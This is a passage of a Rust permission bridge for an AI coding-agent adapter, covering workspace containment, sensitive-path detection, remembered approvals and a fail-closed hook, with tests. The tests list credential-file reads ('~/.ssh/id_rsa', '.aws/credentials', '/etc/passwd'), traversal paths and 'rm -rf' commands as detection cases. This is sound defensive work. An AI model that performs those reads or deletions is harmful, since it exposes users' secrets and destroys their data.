    if parts.is_empty() {
        return "/".to_string();
    }
    let joined = parts.join("/");
    if path.starts_with('/') {
        format!("/{joined}")
    } else {
        joined
    }
}

fn is_inside(path: &str, root: &Path) -> bool {
    // One candidate, and the resolved one wherever it exists. Accepting the path
    // as written too would call `<root>/link/../secret` contained on the strength
    // of its first component, even where `link` points out of the workspace and
    // the kernel follows it there. Where nothing can be resolved -- a file not
    // created yet -- normalizing at least cancels the `..` that `starts_with`
    // would otherwise ignore.
    let candidate =
        resolve(Path::new(path)).unwrap_or_else(|| PathBuf::from(lexical_normalize(path)));
    let roots = [Some(root.to_path_buf()), resolve(root)];
    roots
        .iter()
        .flatten()
        .any(|root| candidate == *root || candidate.starts_with(root))
}

/// Resolves a path, falling back to resolving the nearest existing ancestor so
/// that not-yet-created files can still be placed.
fn resolve(path: &Path) -> Option<PathBuf> {
    if let Ok(resolved) = std::fs::canonicalize(path) {
        return Some(resolved);
    }
    let parent = path.parent()?;
    let name = path.file_name()?;
    std::fs::canonicalize(parent).ok().map(|p| p.join(name))
}

/// Argument fields whose value is a path whatever it looks like.
///
/// agy's tool arguments are a fixed schema and `tool_title` already leans on it.
/// Judging these by name is what lets a plain relative path be checked without
/// having to guess that an arbitrary string is a path -- a `Query` of
/// `src/main.rs` must not start prompting.
///
/// A field missing from this list keeps the shape-based checks and nothing else,
/// which is what every field had before it existed: an omission costs coverage,
/// never a false prompt. It has to track agy.
const PATH_FIELDS: &[&str] = &[
    "AbsolutePath",
    "TargetFile",
    "FilePath",
    "DirectoryPath",
    "SearchPath",
    "SearchDirectory",
    "Cwd",
    "Paths",
];

/// Collects every string sitting under a `PATH_FIELDS` key, at any depth.
fn path_field_args(args: &Value) -> Vec<String> {
    fn walk(value: &Value, under_path_field: bool, found: &mut Vec<String>) {
        match value {
            Value::String(s) if under_path_field => found.push(s.clone()),
            Value::Array(items) => items.iter().for_each(|v| walk(v, under_path_field, found)),
            Value::Object(map) => map.iter().for_each(|(key, v)| {
                walk(
                    v,
                    under_path_field || PATH_FIELDS.contains(&key.as_str()),
                    found,
                )
            }),
            _ => {}
        }
    }
    let mut found = Vec::new();
    walk(args, false, &mut found);
    found
}

/// Model-authored display and pacing fields, observed to differ between two
/// otherwise identical calls to agy 1.1.22. They cannot change what a command is
/// or where it runs, so they are excluded from the sticky key; leaving them in
/// would make "Always allow" never match on a repeat, and an option that visibly
/// does nothing teaches people to stop reading the prompt.
///
/// A denylist rather than an allowlist, and that is the load-bearing choice. An
/// allowlist of "the fields that decide what runs" would be `CommandLine` and
/// `Cwd` today, and a field agy adds later would fall outside the key silently,
/// which is a hole. With a denylist a new field lands *inside* the key; if it is
/// volatile the symptom is a reprompt, which is visible and harmless.
/// Under-normalizing costs a prompt, over-normalizing is a hole.
///
/// Every addition here is a normalization step and needs the same argument made:
/// that the field cannot affect what the tool does. `WaitMsBeforeAsync` is the
/// borderline one — it is behavioural, not presentational, but it can only change
/// how long the adapter waits before backgrounding a command, not what runs or
/// where. It is the entry most worth revisiting if this list ever grows.
const UNKEYED_FIELDS: &[&str] = &["toolAction", "toolSummary", "WaitMsBeforeAsync"];

/// Fingerprints tool arguments for the sticky key: the argument object minus the
/// volatile fields, serialized.
///
/// Top level only, deliberately, and not a recursive strip. Recursion would be
/// over-normalization — it would remove a nested `toolSummary` living inside some
/// future structured argument where the value does matter, merging two argument
/// sets that are not the same into one key. Leaving a nested volatile field in
/// costs a reprompt instead. Note the contrast with [`path_field_args`], which
/// does recurse: that one is looking for a reason to *ask*, so a deeper search is
/// the conservative direction there and the opposite direction here.
///
/// The filtering and the serialization live together on purpose. They must never
/// be reachable separately, or the next reader will fingerprint the unfiltered
/// form and quietly restore the bug this key exists to close.
fn args_fingerprint(args: &Value) -> String {
    match args {
        Value::Object(map) => {
            let kept: serde_json::Map<String, Value> = map
                .iter()
                .filter(|(key, _)| !UNKEYED_FIELDS.contains(&key.as_str()))
                .map(|(key, value)| (key.clone(), value.clone()))
                .collect();
            Value::Object(kept).to_string()
        }
        other => other.to_string(),
    }
}

/// How specific a remembered answer for this call has to be.
///
/// `None` is tool-level keying, and it has to be *earned*. A tool qualifies only
/// when the checks that still run on a remembered allow can actually read its
/// arguments: `escapes_containment` and the sensitive-path list read arguments as
/// paths, so for a path-argument tool like `view_file` they do constrain a
/// remembered allow and the tool name is a defensible scope. That is what
/// `KEYED_BY_TOOL_KINDS` names.
///
/// Everything else — including every tool this fork has never heard of — gets
/// `Some(fingerprint)`. The default direction is the whole point. An unknown tool
/// that turns out to execute something would otherwise land on the weaker key and
/// silently restore the bug this exists to close; being wrong the other way costs
/// a reprompt. Under-normalizing costs a prompt, over-normalizing is a hole.
///
/// [`has_unconstrained_reach`] stays as a second line, and it is not redundant
/// with the kind list: kind is a *display* classification, and a tool can be
/// classified `"read"` while reaching somewhere the path checks cannot see.
/// `read_url_content` is exactly that — kind `"read"`, but its argument is a
/// `Url`, which is not a path field, so containment and the sensitive-path list
/// are as inert against it as they are against a command line. Keying it by tool
/// would let one "Always allow" on a trusted URL cover every later URL. The walk
/// is nested rather than a top-level `args.get`, since a nested or renamed field
/// would otherwise inherit the path tool's weaker key.
fn sticky_scope(tool_name: &str, args: &Value) -> Option<String> {
    if !KEYED_BY_TOOL_KINDS.contains(&tool_kind(tool_name)) || has_unconstrained_reach(args) {
        return Some(args_fingerprint(args));
    }
    None
}

/// Tool kinds whose remembered answers may be keyed by tool name alone, because
/// containment and the sensitive-path list still constrain them.
///
/// Deliberately not `"execute"`, `"fetch"`, or `"other"`. `"other"` is the
/// important one: it is what [`tool_kind`] returns for a name this fork does not
/// know, and an unknown tool must get the stronger key, not the weaker one.
const KEYED_BY_TOOL_KINDS: &[&str] = &["read", "edit", "search"];

/// Whether the arguments reach somewhere the path checks cannot follow.
///
/// Two shapes, both of which make `escapes_containment` and the sensitive-path
/// list inert: a `CommandLine`, which is one opaque string the shell will
/// reinterpret, and a `Url`, which names a resource that is not on the filesystem
/// at all. A bare `://` anywhere in a string value counts too, so a tool that
/// takes a URL under some other field name is still caught. That last test also
/// fires on a search query that happens to contain `://`, which costs a reprompt
/// and is the direction to be wrong in.
/// Whether a `CommandLine` field appears anywhere in the arguments.
///
/// Wording only: this decides whether the prompt says "command" or "call", never
/// how broad the remembered answer is. [`has_unconstrained_reach`] decides that.
fn has_command_line(args: &Value) -> bool {
    match args {
        Value::Array(items) => items.iter().any(has_command_line),
        Value::Object(map) => map
            .iter()
            .any(|(key, value)| key == "CommandLine" || has_command_line(value)),
        _ => false,
    }
}

fn has_unconstrained_reach(args: &Value) -> bool {
    match args {
        Value::String(s) => s.contains("://"),
        Value::Array(items) => items.iter().any(has_unconstrained_reach),
        Value::Object(map) => map.iter().any(|(key, value)| {
            key == "CommandLine" || key == "Url" || has_unconstrained_reach(value)
        }),
        _ => false,
    }
}

/// Collects every absolute-looking path appearing in the tool arguments.
fn absolute_paths(args: &Value) -> Vec<String> {
    string_args(args)
        .into_iter()
        .filter(|s| s.starts_with('/'))
        .collect()
}

/// Collects every string value anywhere in the tool arguments.
fn string_args(args: &Value) -> Vec<String> {
    fn walk(value: &Value, found: &mut Vec<String>) {
        match value {
            Value::String(s) => found.push(s.clone()),
            Value::Array(items) => items.iter().for_each(|v| walk(v, found)),
            Value::Object(map) => map.values().for_each(|v| walk(v, found)),
            _ => {}
        }
    }
    let mut found = Vec::new();
    walk(args, &mut found);
    found
}

/// True if any string argument points inside the adapter's hook directory.
///
/// Deliberately a substring test over every argument rather than a check of known
/// path fields: the hook root is an unmistakable temp path, and tool arguments that
/// embed it (a shell command line, say) matter just as much as a `TargetFile`.
fn targets_hook_root(args: &Value, hook_root: &Path) -> bool {
    let needle = hook_root.to_string_lossy();
    fn any_string(value: &Value, needle: &str) -> bool {
        match value {
            Value::String(s) => s.contains(needle),
            Value::Array(items) => items.iter().any(|v| any_string(v, needle)),
            Value::Object(map) => map.values().any(|v| any_string(v, needle)),
            _ => false,
        }
    }
    any_string(args, &needle)
}

fn step_idx(payload: &Value) -> i64 {
    payload
        .get("stepIdx")
        .and_then(|v| v.as_i64())
        .unwrap_or(-1)
}

/// Maps an agy tool name onto the closest ACP tool kind.
fn tool_kind(tool_name: &str) -> &'static str {
    match tool_name {
        "view_file" | "view_code_item" | "list_dir" | "read_url_content" => "read",
        "write_to_file" | "replace_file_content" | "edit_file" | "propose_code" => "edit",
        "grep_search" | "codebase_search" | "find_by_name" => "search",
        "run_command" | "command_status" => "execute",
        "search_web" => "fetch",
        _ => "other",
    }
}

/// Builds the one-line summary the ACP client shows in the prompt.
fn tool_title(tool_name: &str, args: &Value) -> String {
    let field = |key: &str| args.get(key).and_then(|v| v.as_str());

    if let Some(command) = field("CommandLine") {
        return format!("Run `{command}`");
    }
    if let Some(target) = field("TargetFile") {
        return format!("{tool_name} {target}");
    }
    if let Some(path) = field("AbsolutePath").or_else(|| field("DirectoryPath")) {
        return format!("{tool_name} {path}");
    }
    if let Some(query) = field("Query").or_else(|| field("SearchTerm")) {
        return format!("{tool_name} {query}");
    }
    tool_name.to_string()
}

fn default_socket_path() -> PathBuf {
    let mut path = std::env::temp_dir();
    path.push(format!("agy-acp-perm-{}.sock", std::process::id()));
    path
}

/// Entry point for `agy-acp permission-hook`, the command wired into agy's
/// `PreToolUse` hook. Reads the hook payload on stdin, asks the running adapter
/// over the bridge socket, and writes agy's decision JSON to stdout.
///
/// The hook only ever reaches agy through the adapter's private hook directory,
/// so a missing socket means the adapter that owns this run is gone. Every failure
/// path denies: agy runs with its own permission checks disabled whenever this
/// hook is installed, so an unanswerable request must not become an allow.
///
/// Every response carries an explicit `decision`. A decision-less response (`{}`)
/// leaves agy waiting on the tool call until the prompt times out.
pub fn run_hook() {
    use std::io::{Read, Write};

    let mut payload = String::new();
    let _ = std::io::stdin().read_to_string(&mut payload);

    let decision = match std::env::var(SOCKET_ENV) {
        Ok(path) if !path.is_empty() => hook_roundtrip(&path, payload.trim()),
        _ => Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            format!("{SOCKET_ENV} is not set"),
        )),
    }
    .unwrap_or_else(|err| {
        Decision::Deny
            .as_hook_json(&format!("agy-acp: permission bridge unavailable ({err})"))
            .to_string()
    });

    let mut stdout = std::io::stdout();
    let _ = writeln!(stdout, "{decision}");
    let _ = stdout.flush();
}

fn hook_roundtrip(socket_path: &str, payload: &str) -> std::io::Result<String> {
    use std::io::{BufRead, BufReader as StdBufReader, Write};
    use std::os::unix::net::UnixStream as StdUnixStream;

    let mut stream = StdUnixStream::connect(socket_path)?;
    stream.write_all(payload.as_bytes())?;
    stream.write_all(b"\n")?;
    stream.flush()?;

    let mut reader = StdBufReader::new(stream);
    let mut response = String::new();
    reader.read_line(&mut response)?;

    let response = response.trim().to_string();
    if response.is_empty() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::UnexpectedEof,
            "empty response from adapter",
        ));
    }
    Ok(response)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tool_titles_prefer_the_most_specific_argument() {
        assert_eq!(
            tool_title("run_command", &json!({ "CommandLine": "rm -rf build" })),
            "Run `rm -rf build`"
        );
        assert_eq!(
            tool_title("write_to_file", &json!({ "TargetFile": "/tmp/a.txt" })),
            "write_to_file /tmp/a.txt"
        );
        assert_eq!(tool_title("some_tool", &json!({})), "some_tool");
    }

    #[test]
    fn tool_kinds_cover_the_common_agy_tools() {
        assert_eq!(tool_kind("view_file"), "read");
        assert_eq!(tool_kind("write_to_file"), "edit");
        assert_eq!(tool_kind("run_command"), "execute");
        assert_eq!(tool_kind("mystery_tool"), "other");
    }

    #[tokio::test]
    async fn unknown_conversations_are_denied() {
        let (tx, _rx) = mpsc::unbounded_channel();
        let bridge = PermissionBridge {
            state: Arc::new(Mutex::new(BridgeState::default())),
            out_tx: tx,
            socket_path: Arc::new(PathBuf::from("/tmp/unused.sock")),
        };

        let (decision, reason) = bridge
            .decide(&json!({
                "conversationId": "never-registered",
                "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
            }))
            .await;

        assert_eq!(decision, Decision::Deny);
        assert!(reason.contains("no ACP session"));
    }

    /// The adapter turns "the user refused" into stopReason refusal instead of a
    /// provider error. A deny the bridge issued on its own must not claim that,
    /// or it would suppress the error for a genuine failure later in the turn.
    #[tokio::test]
    async fn only_the_users_own_refusal_counts_as_a_refusal() {
        let (tx, mut rx) = mpsc::unbounded_channel();
        let bridge = PermissionBridge {
            state: Arc::new(Mutex::new(BridgeState::default())),
            out_tx: tx,
            socket_path: Arc::new(PathBuf::from("/tmp/unused.sock")),
        };
        bridge.set_active_session(Some("session-1")).await;

        // Fail-closed deny: no session is registered for this conversation and
        // there is no active one to fall back to.
        bridge.set_active_session(None).await;
        let (decision, _) = bridge
            .decide(&json!({
                "conversationId": "conv-unknown",
                "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
            }))
            .await;
        assert_eq!(decision, Decision::Deny);
        assert!(
            !bridge.refused_during_prompt().await,
            "a fail-closed deny is not the user refusing"
        );

        // The user's own answer.
        bridge.set_active_session(Some("session-1")).await;
        bridge.register_conversation("conv-1", "session-1").await;
        bridge.set_active_session(Some("session-1")).await;
        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        assert!(
            bridge
                .resolve_response(
                    &request["id"],
                    Some(
                        json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })
                    ),
                )
                .await
        );
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
        assert!(
            bridge.refused_during_prompt().await,
            "a selected reject option is the user refusing"
        );

        // A new prompt starts clean.
        bridge.set_active_session(Some("session-1")).await;
        assert!(!bridge.refused_during_prompt().await);
    }

    #[tokio::test]
    async fn a_registered_conversation_asks_the_client_and_honors_approval() {
        let (tx, mut rx) = mpsc::unbounded_channel();
        let bridge = PermissionBridge {
            state: Arc::new(Mutex::new(BridgeState::default())),
            out_tx: tx,
            socket_path: Arc::new(PathBuf::from("/tmp/unused.sock")),
        };
        bridge.register_conversation("conv-1", "session-1").await;
        bridge.set_active_session(Some("session-1")).await;

        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
                    }))
                    .await
            })
        };

        let request = expect_permission_request(&mut rx).await;
        assert_eq!(request["params"]["sessionId"], "session-1");
        assert_eq!(request["params"]["toolCall"]["title"], "Run `ls`");

        let id = request["id"].clone();
        assert!(
            bridge
                .resolve_response(
                    &id,
                    Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_once" } })),
                )
                .await
        );

        let (decision, _) = asking.await.unwrap();
        assert_eq!(decision, Decision::Allow);
    }

    #[tokio::test]
    async fn always_allow_is_remembered_for_later_calls() {
        let (tx, mut rx) = mpsc::unbounded_channel();
        let bridge = PermissionBridge {
            state: Arc::new(Mutex::new(BridgeState::default())),
            out_tx: tx,
            socket_path: Arc::new(PathBuf::from("/tmp/unused.sock")),
        };
        bridge.register_conversation("conv-1", "session-1").await;
        bridge.set_active_session(Some("session-1")).await;

        let payload = json!({
            "conversationId": "conv-1",
            "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
        });

        let first = {
            let bridge = bridge.clone();
            let payload = payload.clone();
            tokio::spawn(async move { bridge.decide(&payload).await })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
            )
            .await;
        assert_eq!(first.await.unwrap().0, Decision::Allow);

        // The second call must resolve from cache without asking the client again.
        let (decision, _) = bridge.decide(&payload).await;
        assert_eq!(decision, Decision::Allow);
        assert!(rx.try_recv().is_err());
    }

    #[test]
    fn hook_root_targets_are_spotted_in_any_argument() {
        let root = Path::new("/tmp/agy-acp-hooks-42");
        assert!(targets_hook_root(
            &json!({ "TargetFile": "/tmp/agy-acp-hooks-42/a.txt" }),
            root
        ));
        assert!(targets_hook_root(
            &json!({ "CommandLine": "rm -rf /tmp/agy-acp-hooks-42" }),
            root
        ));
        assert!(targets_hook_root(
            &json!({ "Paths": ["ok.txt", "/tmp/agy-acp-hooks-42/b.txt"] }),
            root
        ));
        assert!(!targets_hook_root(
            &json!({ "TargetFile": "/work/repo/a.txt" }),
            root
        ));
    }

    #[tokio::test]
    async fn tool_calls_aimed_at_the_hook_root_are_refused_without_asking() {
        let (tx, mut rx) = mpsc::unbounded_channel();
        let bridge = PermissionBridge {
            state: Arc::new(Mutex::new(BridgeState::default())),
            out_tx: tx,
            socket_path: Arc::new(PathBuf::from("/tmp/unused.sock")),
        };
        bridge.register_conversation("conv-1", "session-1").await;
        bridge.set_active_session(Some("session-1")).await;
        bridge
            .set_hook_root(Path::new("/tmp/agy-acp-hooks-42"))
            .await;

        let (decision, reason) = bridge
            .decide(&json!({
                "conversationId": "conv-1",
                "toolCall": {
                    "name": "write_to_file",
                    "args": { "TargetFile": "/tmp/agy-acp-hooks-42/a.txt" },
                },
            }))
            .await;

        assert_eq!(decision, Decision::Deny);
        assert!(reason.contains("internal directory"));
        assert!(rx.try_recv().is_err(), "the user must not be prompted");
    }

    /// Waits for the bridge to ask the user, failing fast if it never does.
    ///
    /// A missing prompt is the interesting failure here -- it means a check was
    /// bypassed -- and without a timeout that shows up as the whole suite
    /// hanging rather than as a red test.
    async fn expect_permission_request(rx: &mut mpsc::UnboundedReceiver<Option<String>>) -> Value {
        let raw = tokio::time::timeout(std::time::Duration::from_secs(5), rx.recv())
            .await
            .expect("the bridge must ask the user, not decide on its own")
            .unwrap()
            .unwrap();
        let request: Value = serde_json::from_str(&raw).unwrap();
        assert_eq!(request["method"], "session/request_permission");
        request
    }

    /// Waits for a decision the bridge reaches on its own, failing fast if it
    /// asks instead. The mirror of `expect_permission_request`: an unwanted
    /// prompt goes unanswered here and would otherwise block for the whole
    /// nine-minute response timeout, reading as a hung suite, not a red test.
    async fn expect_auto_decision(bridge: &PermissionBridge, payload: Value) -> (Decision, String) {
        tokio::time::timeout(std::time::Duration::from_secs(5), bridge.decide(&payload))
            .await
            .expect("the bridge must decide on its own, not ask the user")
    }

    /// Builds a bridge wired to a session, a workspace and an explicit policy.
    async fn test_bridge(
        workspace: &str,
        auto_allow: &[&str],
    ) -> (PermissionBridge, mpsc::UnboundedReceiver<Option<String>>) {
        let (tx, rx) = mpsc::unbounded_channel();
        let bridge = PermissionBridge {
            state: Arc::new(Mutex::new(BridgeState {
                policy: AutoAllowPolicy::with_tools(auto_allow),
                ..BridgeState::default()
            })),
            out_tx: tx,
            socket_path: Arc::new(PathBuf::from("/tmp/unused.sock")),
        };
        bridge.register_conversation("conv-1", "session-1").await;
        // Every `decide` in production happens inside a running turn --
        // `handle_session_prompt` sets this before agy is spawned. A test that
        // left it unset would be exercising a state the adapter cannot reach.
        bridge.set_active_session(Some("session-1")).await;
        bridge.set_workspace_root(workspace).await;
        (bridge, rx)
    }

    #[test]
    fn only_ask_question_is_auto_allowed_by_default() {
        let policy = AutoAllowPolicy::from_env();
        assert!(policy.allows("ask_question"));
        for tool in ["view_file", "list_dir", "grep_search", "run_command"] {
            assert!(!policy.allows(tool), "{tool} must not be auto-allowed");
        }
    }

    #[test]
    fn groups_and_none_are_understood() {
        let readers = AutoAllowPolicy {
            tools: READ_TOOLS.iter().map(|t| t.to_string()).collect(),
            extra_sensitive: Vec::new(),
        };
        assert!(readers.allows("view_file"));
        assert!(!readers.allows("grep_search"));
        assert!(!AutoAllowPolicy::default().allows("ask_question"));
    }

    #[test]
    fn credential_looking_paths_are_flagged() {
        let policy = AutoAllowPolicy::with_tools(&[]);
        for path in [
            "/work/.env",
            "/work/.env.production",
            "/work/config/API_TOKEN.txt",
            "/work/secrets.yaml",
            "/work/server.pem",
            "/Users/me/.ssh/id_rsa",
            "/Users/me/.aws/credentials",
            "/work/.npmrc",
        ] {
            assert!(policy.is_sensitive(path), "{path} should be sensitive");
        }
        for path in ["/work/src/main.rs", "/work/README.md"] {
            assert!(!policy.is_sensitive(path), "{path} should be ordinary");
        }
    }

    #[test]
    fn extra_sensitive_patterns_are_honoured() {
        let policy = AutoAllowPolicy {
            tools: Vec::new(),
            extra_sensitive: vec!["patient".to_string()],
        };
        assert!(policy.is_sensitive("/work/patient_data.csv"));
        assert!(!policy.is_sensitive("/work/notes.csv"));
    }

    #[tokio::test]
    async fn sensitive_reads_still_ask_even_when_reads_are_auto_allowed() {
        let workspace = std::env::temp_dir().join("agy-acp-sensitive-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), READ_TOOLS).await;

        let asking = {
            let bridge = bridge.clone();
            let target = workspace.join(".env").display().to_string();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "view_file", "args": { "AbsolutePath": target } },
                    }))
                    .await
            })
        };

        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    #[tokio::test]
    async fn reads_inside_the_workspace_are_allowed_without_asking() {
        let workspace = std::env::temp_dir().join("agy-acp-auto-allow-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(
            &workspace.display().to_string(),
            &["ask_question", "view_file", "view_code_item", "list_dir"],
        )
        .await;

        for (tool, args) in [
            (
                "view_file",
                json!({ "AbsolutePath": workspace.join("a.rs") }),
            ),
            ("list_dir", json!({ "DirectoryPath": workspace.to_str() })),
            ("ask_question", json!({ "Question": "which one?" })),
        ] {
            let (decision, reason) = bridge
                .decide(&json!({
                    "conversationId": "conv-1",
                    "toolCall": { "name": tool, "args": args },
                }))
                .await;
            assert_eq!(decision, Decision::Allow, "{tool} should be auto-allowed");
            assert!(reason.contains("Auto-allowed"), "{tool}: {reason}");
        }
        assert!(rx.try_recv().is_err(), "the user must not be prompted");
    }

    #[tokio::test]
    async fn reads_outside_the_workspace_still_ask() {
        let workspace = std::env::temp_dir().join("agy-acp-auto-allow-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(
            &workspace.display().to_string(),
            &["ask_question", "view_file", "view_code_item", "list_dir"],
        )
        .await;

        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": {
                            "name": "view_file",
                            "args": { "AbsolutePath": "/Users/someone/.ssh/id_rsa" },
                        },
                    }))
                    .await
            })
        };

        let request = expect_permission_request(&mut rx).await;

        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    #[tokio::test]
    async fn parent_traversal_is_treated_as_outside_the_workspace() {
        let workspace = std::env::temp_dir().join("agy-acp-dotdot-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), READ_TOOLS).await;

        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "view_file", "args": { "AbsolutePath": "../../secret" } },
                    }))
                    .await
            })
        };

        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    #[tokio::test]
    async fn home_relative_paths_are_treated_as_outside_the_workspace() {
        let workspace = std::env::temp_dir().join("agy-acp-home-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), READ_TOOLS).await;

        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "view_file", "args": { "AbsolutePath": "~/.ssh/id_rsa" } },
                    }))
                    .await
            })
        };

        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    #[tokio::test]
    async fn dot_dot_inside_the_workspace_is_still_inside() {
        let workspace = std::env::temp_dir().join("agy-acp-dotdot-inside-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), READ_TOOLS).await;

        let target = format!("{}/sub/../file.txt", workspace.display());
        let (decision, reason) = expect_auto_decision(
            &bridge,
            json!({
                "conversationId": "conv-1",
                "toolCall": { "name": "view_file", "args": { "AbsolutePath": target } },
            }),
        )
        .await;

        assert_eq!(
            decision,
            Decision::Allow,
            "a `..` that stays inside must auto-allow"
        );
        assert!(reason.contains("Auto-allowed"), "{reason}");
        assert!(rx.try_recv().is_err(), "the user must not be prompted");
    }

    #[tokio::test]
    async fn a_relative_dot_dot_that_stays_inside_the_workspace_is_still_inside() {
        let workspace = std::env::temp_dir().join("agy-acp-relative-dotdot-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), READ_TOOLS).await;

        // Relative to the workspace this is just `file.txt`. Normalizing it without
        // the workspace leaves a rootless `file.txt`, which matches no root and
        // would prompt for a read that never leaves the workspace.
        let (decision, reason) = expect_auto_decision(
            &bridge,
            json!({
                "conversationId": "conv-1",
                "toolCall": { "name": "view_file", "args": { "AbsolutePath": "sub/../file.txt" } },
            }),
        )
        .await;

        assert_eq!(
            decision,
            Decision::Allow,
            "a workspace-relative `..` that stays inside must auto-allow"
        );
        assert!(reason.contains("Auto-allowed"), "{reason}");
        assert!(rx.try_recv().is_err(), "the user must not be prompted");
    }

    /// `outside_workspace` is pure, so these go straight at it: they cover the
    /// shapes that never reach a bridge test because they are decided before the
    /// prompt.
    #[test]
    fn without_a_workspace_root_nothing_is_contained() {
        let none: &[PathBuf] = &[];
        let outside = |args| outside_workspace(&args, none);

        assert_eq!(
            outside(json!({ "AbsolutePath": "/etc/passwd" })).as_deref(),
            Some("/etc/passwd")
        );
        // These two used to slip through: the empty-roots branch looked only at
        // arguments starting with `/`, so an unset workspace made them contained.
        assert_eq!(
            outside(json!({ "AbsolutePath": "~/.ssh/id_rsa" })).as_deref(),
            Some("~/.ssh/id_rsa")
        );
        assert_eq!(
            outside(json!({ "AbsolutePath": "../../secret" })).as_deref(),
            Some("../../secret")
        );
        assert_eq!(
            outside(json!({ "Query": "foo..bar" })),
            None,
            "a query is not a path, with or without a root"
        );
    }

    /// A symlink is the case lexical normalization cannot see: `link/..` cancels
    /// on paper, but the kernel resolves `link` first and `..` then leaves from
    /// wherever it landed.
    #[test]
    fn a_symlink_out_of_the_workspace_is_not_contained() {
        let base = std::env::temp_dir().join(format!("agy-acp-symlink-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let workspace = base.join("work");
        let outside = base.join("outside");
        std::fs::create_dir_all(&workspace).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(outside.join("secret.txt"), "s").unwrap();
        std::fs::write(workspace.join("file.txt"), "f").unwrap();
        std::os::unix::fs::symlink(&outside, workspace.join("link")).unwrap();

        let roots = vec![workspace.clone()];
        let escaping = format!("{}/link/../outside/secret.txt", workspace.display());

        assert_eq!(
            outside_workspace(&json!({ "AbsolutePath": escaping }), &roots).as_deref(),
            Some(escaping.as_str()),
            "an absolute path that leaves through a symlink is outside"
        );
        assert!(
            outside_workspace(
                &json!({ "AbsolutePath": "link/../outside/secret.txt" }),
                &roots
            )
            .is_some(),
            "and so is the same path written relative to the workspace"
        );
        assert_eq!(
            outside_workspace(
                &json!({ "AbsolutePath": format!("{}/sub/../file.txt", workspace.display()) }),
                &roots
            ),
            None,
            "a `..` over a directory that does not exist still resolves inside"
        );

        // The shape-based tests see nothing wrong with this one: no leading `/`,
        // no `~`, no `..`. It is judged because `AbsolutePath` is a path field.
        assert_eq!(
            outside_workspace(&json!({ "AbsolutePath": "link/secret.txt" }), &roots).as_deref(),
            Some("link/secret.txt"),
            "a plain relative path field still leaves through the symlink"
        );
        // `find_by_name` names its directory `SearchDirectory`, seen in real agy
        // traffic. A relative value has no leading `/`, no `~` and no `..`, so the
        // shape tests pass it; only the field name catches it.
        assert_eq!(
            outside_workspace(&json!({ "SearchDirectory": "link" }), &roots).as_deref(),
            Some("link"),
            "a relative SearchDirectory that leaves through a symlink is outside"
        );
        // `FilePath` has not been seen in agy traffic, but `tools.rs` and
        // `protobuf.rs` both already treat it as naming a location, and the two
        // lists disagreeing is the kind of gap this test exists to catch.
        assert_eq!(
            outside_workspace(&json!({ "FilePath": "link" }), &roots).as_deref(),
            Some("link"),
            "a relative FilePath that leaves through a symlink is outside"
        );
        assert_eq!(
            outside_workspace(&json!({ "Query": "link/secret.txt" }), &roots),
            None,
            "the same string in a query field is a search term, not a path"
        );
        assert_eq!(
            outside_workspace(&json!({ "TargetFile": "notes.txt" }), &roots),
            None,
            "a relative path field inside the workspace stays silent"
        );
        assert_eq!(
            outside_workspace(
                &json!({ "Paths": ["notes.txt", "link/secret.txt"] }),
                &roots
            )
            .as_deref(),
            Some("link/secret.txt"),
            "path fields are judged through arrays too"
        );

